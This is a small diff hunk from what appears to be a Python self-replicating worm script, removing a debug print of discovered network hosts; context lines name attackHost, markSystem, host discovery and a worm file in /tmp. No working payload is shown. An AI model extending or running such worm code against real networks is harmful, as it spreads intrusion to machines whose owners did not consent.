@@ -121,8 +121,6 @@ def attackHost(host):
 markSystem();
 network = getHostsOnTheSameNetwork()
 
-print network
-
 wormLocation = "/tmp/replicating_worm.py"
 
 if len(sys.argv) >= 2:
